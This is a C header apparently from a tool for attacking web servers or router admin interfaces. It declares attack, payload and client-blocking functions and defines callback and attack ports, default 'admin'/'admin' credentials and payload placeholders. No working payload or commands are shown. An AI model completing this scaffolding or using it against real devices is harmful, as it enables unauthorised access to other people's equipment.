#define ATTACK_DONE		1
#define ATTACK_CONTINUE		0
#define INIT_REQUEST		"/init"
#define INIT_REQUEST_SIZE	5
#define RAND_HOST_LEN           5
#define ASCII_MIN               97
#define ASCII_MAX               25
#define CHECK_CLIENT_INTERVAL	5
#define DEFAULT_PATH		"/"
#define DEFAULT_USER		"admin"
#define DEFAULT_PASS		"admin"
#define DEFAULT_INTERVAL	"2000"
#define DEFAULT_CALLBACK_PORT	"81"
#define DEFAULT_ATTACK_PORT	"80"
#define USER_PLACEHOLDER	"USER"
#define PASS_PLACEHOLDER	"PASS"
#define PATH_PLACEHOLDER	"PATH"
#define PORT_PLACEHOLDER	"PORT"
#define TIME_PLACEHOLDER	"INTERVAL"
#define COOKIE_PLACEHOLDER	"COOKIE"

int attack_web_server();
int process_client_request(struct sockaddr_in clientaddr,int csock,char *buffer,int buflen);
int send_payload(int csock);
char *configure_payload();
void block_client(char *client_ip_address);
void insert_client(char *ip);
void cleanup_iptables(int sig);
